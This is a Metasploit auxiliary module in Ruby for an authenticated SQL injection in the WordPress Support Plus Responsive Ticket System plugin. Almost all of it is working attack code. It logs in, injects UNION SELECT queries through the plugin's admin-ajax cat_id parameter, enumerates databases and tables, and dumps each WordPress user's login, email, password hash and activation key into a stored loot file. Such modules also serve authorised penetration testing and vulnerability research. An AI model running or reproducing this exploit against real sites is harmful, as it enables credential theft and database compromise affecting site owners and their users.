##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress Support Plus Responsive Ticket System SQL Injection',
      'Description'    => %q{

    This module exploits an authenticated SQL injection in order to retrieve
    usernames and password hashes from the Wordpress database. Any user credential
    can be used, not just admin.
      },
      'References'     =>
        [
          ['EDB', '40939']
        ],
      'Author'         =>
        [
          'VolatileMinds'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Dec 12 2016"
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI', '/']),
        OptString.new("USERNAME", [true, 'The username to authenticate with', 'admin']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'password'])
      ], self.class)
  end

  def login(username, password)
    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-login.php'),
      'vars_post' => {
        'log' => username,
        'pwd' => password
      }
    })
  end

  def check
    res = login(datastore['USERNAME'], datastore['PASSWORD'])

    if res and res.code == 200
      print_bad("Error authenticating")
      return Msf::Exploit::CheckCode::Unknown
    end

    flag = Rex::Text.rand_text_alpha(5)
    left = Rex::Text.rand_text_alpha(5)
    right = Rex::Text.rand_text_alpha(5)

    sql = "UNION SELECT 1,CONCAT(0x#{left.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{right.unpack("H*")[0]}),3"

    res = make_injected_request(sql, res.get_cookies)

    if res and res.body =~ /#{left}#{flag}#{right}/
      return Msf::Exploit::CheckCode::Vulnerable
    else
      return Msf::Exploit::CheckCode::Safe
    end
  end

  def run
    res = login(datastore['USERNAME'], datastore['PASSWORD'])

    if res and res.code == 200
      fail_with(Failure::Authentication, 'Failed to authenticate')
    end

    cookies = res.get_cookies
    left = Rex::Text.rand_text_alpha(5)
    right = Rex::Text.rand_text_alpha(5)

    dbs = []
    sql = "UNION ALL SELECT 1,CONCAT(0x#{left.unpack("H*")[0]},IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20),0x#{right.unpack("H*")[0]}),2 FROM INFORMATION_SCHEMA.SCHEMATA"
    res = make_injected_request(sql, cookies)

    db_count = nil
    db_count = $1 if res && res.body =~ /#{left}(.*)#{right}/

    unless db_count
      fail_with(Failure::Unknown, 'Server did not respond in an expected way.')
    end

    0.upto(db_count.to_i-1) do |db|
      get_db = "UNION ALL SELECT 1,(SELECT CONCAT(0x#{left.unpack("H*")[0]},IFNULL(CAST(schema_name AS CHAR),0x20),0x#{right.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{db},1),3"
      res = make_injected_request(get_db, cookies)
      db = nil
      db = $1 if res and res.body =~ /#{left}(.*)#{right}/
      dbs << db if db
    end

    dbs.delete('mysql')
    dbs.delete('performance_schema')
    dbs.delete('information_schema')

    dbs.each do |db|
      vprint_good("Looking for users in db #{db}")

      tb_count = "UNION ALL SELECT 1,CONCAT(0x#{left.unpack("H*")[0]},IFNULL(CAST(COUNT(table_name) AS CHAR),0x20),0x#{right.unpack("H*")[0]}),2 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})"

      res = make_injected_request(tb_count, cookies)

      tb_count = nil
      tb_count = $1 if res and res.body =~ /#{left}(.*)#{right}/

      unless tb_count
        fail_with(Failure::Unknown, 'Server did not respond in an expected way')
      end

      tables = []
      0.upto(tb_count.to_i-1) do |tb|
        get_tb = "UNION ALL SELECT 1,(SELECT CONCAT(0x#{left.unpack("H*")[0]},IFNULL(CAST(table_name AS CHAR),0x20),0x#{right.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]}) LIMIT #{tb},1),2"
        res = make_injected_request(get_tb, cookies)

        name = nil
        name = $1 if res and res.body =~ /#{left}(.*)#{right}/

        tables << name if name and name =~ /_users$/
      end

      tables.each do|table|
        vprint_good("Looking in table #{table}")
        get_num_users = "UNION ALL SELECT 1,CONCAT(0x#{left.unpack("H*")[0]},IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x#{right.unpack("H*")[0]}),2 FROM #{db}.#{table}"
        res = make_injected_request(get_num_users, cookies)
        count = nil
        count = $1 if res and res.body =~ /#{left}(.*)#{right}/
        unless count
          fail_with('Server did not respond in an expected way')
        end

        users = []
        0.upto(count.to_i-1) do |user|
          get_user = "UNION ALL SELECT 1,(SELECT CONCAT(0x#{left.unpack("H*")[0]},IFNULL(CAST(ID AS CHAR),0x20),0x#{right.unpack("H*")[0]},IFNULL(CAST(display_name AS CHAR),0x20),0x#{right.unpack("H*")[0]},IFNULL(CAST(user_activation_key AS CHAR),0x20),0x#{right.unpack("H*")[0]},IFNULL(CAST(user_email AS CHAR),0x20),0x#{right.unpack("H*")[0]},IFNULL(CAST(user_login AS CHAR),0x20),0x#{right.unpack("H*")[0]},IFNULL(CAST(user_nicename AS CHAR),0x20),0x#{right.unpack("H*")[0]},IFNULL(CAST(user_pass AS CHAR),0x20),0x#{right.unpack("H*")[0]},IFNULL(CAST(user_registered AS CHAR),0x20),0x#{right.unpack("H*")[0]},IFNULL(CAST(user_status AS CHAR),0x20),0x#{right.unpack("H*")[0]},IFNULL(CAST(user_url AS CHAR),0x20),0x#{right.unpack("H*")[0]}) FROM #{db}.#{table} LIMIT #{user},1),2 "

          res = make_injected_request(get_user, cookies)

          match = /#{left}(.*)#{right}(.*)#{right}(.*)#{right}(.*)#{right}(.*)#{right}(.*)#{right}(.*)#{right}(.*)#{right}(.*)#{right}(.*)#{right}/.match(res.body)

          users << {
            'username' => match[5],
            'password' => match[7],
            'registered' => match[8],
            'display_name' => match[2],
            'nicename' => match[6],
            'url' => match[10],
            'activation_key' => match[3],
            'status' => match[9],
            'email' => match[4],
            'id' => match[1]
          }
        end

        p = store_loot('wordpress.users', "application/javascript", datastore['RHOST'], users.to_json, "#{datastore['RHOST']}_wordpress_users.txt", "Wordpress Users", 'User details for Wordpress')

        print_good("Users saved in file #{p}")
      end
    end
  end

  def make_injected_request(sql, cookie)
    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
      'vars_post' => {
        'action' => 'wpsp_getCatName',
        'cat_id' => '0 ' + sql
      },
      'cookie' => cookie
    })
  end
end

